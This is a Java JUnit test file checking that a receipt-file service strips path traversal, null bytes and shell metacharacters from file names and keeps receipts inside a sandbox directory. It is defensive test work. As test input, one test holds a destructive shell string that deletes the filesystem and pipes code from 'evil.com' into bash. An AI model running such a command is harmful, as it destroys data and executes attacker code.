package com.example.desofs.services;

import org.junit.jupiter.api.*;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.io.IOException;
import java.nio.file.*;

import static org.junit.jupiter.api.Assertions.*;

class ReceiptFileServiceTest {

    private ReceiptFileService receiptFileService;
    private Path tempDir;

    @BeforeEach
    void setUp() throws IOException {
        tempDir = Files.createTempDirectory("emovieshop-test-receipts");
        receiptFileService = new ReceiptFileService(tempDir.toString(), 100);
    }

    @AfterEach
    void tearDown() throws IOException {
        // Clean up temp files
        if (Files.exists(tempDir)) {
            Files.walk(tempDir)
                    .sorted((a, b) -> b.compareTo(a))
                    .forEach(path -> {
                        try { Files.deleteIfExists(path); } catch (IOException ignored) {}
                    });
        }
    }

    // ---- sanitizeReceiptName tests ----

    @Test
    @DisplayName("Valid receipt name is preserved")
    void sanitizeReceiptName_validName_preserved() {
        assertEquals("My Receipt", receiptFileService.sanitizeReceiptName("My Receipt"));
    }

    @Test
    @DisplayName("Hyphens and underscores are preserved")
    void sanitizeReceiptName_hyphensUnderscores_preserved() {
        assertEquals("my-receipt_2024", receiptFileService.sanitizeReceiptName("my-receipt_2024"));
    }

    @Test
    @DisplayName("Path traversal sequences are stripped")
    void sanitizeReceiptName_pathTraversal_stripped() {
        String result = receiptFileService.sanitizeReceiptName("../../etc/passwd");
        assertFalse(result.contains(".."));
        assertFalse(result.contains("/"));
        assertFalse(result.contains("\\"));
    }

    @Test
    @DisplayName("Null bytes are stripped")
    void sanitizeReceiptName_nullBytes_stripped() {
        String result = receiptFileService.sanitizeReceiptName("receipt\0name");
        assertFalse(result.contains("\0"));
        assertEquals("receiptname", result);
    }

    @Test
    @DisplayName("Shell metacharacters are stripped")
    void sanitizeReceiptName_shellMetachars_stripped() {
        String result = receiptFileService.sanitizeReceiptName("; rm -rf / && curl evil.com | bash");
        assertFalse(result.contains(";"));
        assertFalse(result.contains("&"));
        assertFalse(result.contains("|"));
    }

    @ParameterizedTest
    @ValueSource(strings = {"CON", "NUL", "PRN", "AUX", "COM1", "LPT1"})
    @DisplayName("Windows reserved names are sanitized (no special characters remain)")
    void sanitizeReceiptName_windowsReserved_sanitized(String name) {
        // These names should pass sanitization (they're alphanumeric),
        // but the orderId suffix in filename makes them safe
        String result = receiptFileService.sanitizeReceiptName(name);
        assertNotNull(result);
        assertFalse(result.isBlank());
    }

    @Test
    @DisplayName("Name exceeding max length is truncated")
    void sanitizeReceiptName_tooLong_truncated() {
        String longName = "A".repeat(200);
        String result = receiptFileService.sanitizeReceiptName(longName);
        assertEquals(100, result.length());
    }

    @Test
    @DisplayName("Blank name throws exception")
    void sanitizeReceiptName_blank_throws() {
        assertThrows(IllegalArgumentException.class,
                () -> receiptFileService.sanitizeReceiptName("   "));
    }

    @Test
    @DisplayName("Null name throws exception")
    void sanitizeReceiptName_null_throws() {
        assertThrows(IllegalArgumentException.class,
                () -> receiptFileService.sanitizeReceiptName(null));
    }

    @Test
    @DisplayName("Name with only special characters throws exception after sanitization")
    void sanitizeReceiptName_onlySpecialChars_throws() {
        assertThrows(IllegalArgumentException.class,
                () -> receiptFileService.sanitizeReceiptName("!@#$%^&*()"));
    }

    // ---- createReceiptFile tests ----

    @Test
    @DisplayName("Receipt file is created in the correct directory")
    void createReceiptFile_createsFileInCorrectDir() throws IOException {
        var order = TestOrderFactory.createTestOrder(1L, "Test Receipt", 2);

        Path result = receiptFileService.createReceiptFile(order);

        assertTrue(Files.exists(result));
        assertTrue(result.startsWith(tempDir));
        assertTrue(result.getFileName().toString().endsWith(".txt"));
        assertTrue(result.getFileName().toString().contains("Test Receipt"));
    }

    @Test
    @DisplayName("Receipt file contains order summary")
    void createReceiptFile_containsOrderSummary() throws IOException {
        var order = TestOrderFactory.createTestOrder(1L, "Customer Name", 1);

        Path result = receiptFileService.createReceiptFile(order);

        String content = Files.readString(result);
        assertTrue(content.contains("eMovieShop Receipt"));
        assertTrue(content.contains("Order ID"));
        assertTrue(content.contains("TOTAL"));
    }

    @Test
    @DisplayName("Receipt file with path traversal in name stays in sandbox")
    void createReceiptFile_pathTraversalName_staysInSandbox() throws IOException {
        var order = TestOrderFactory.createTestOrder(1L, "../../evil", 1);

        Path result = receiptFileService.createReceiptFile(order);

        assertTrue(result.startsWith(tempDir), "File must be inside receipts directory");
    }
}
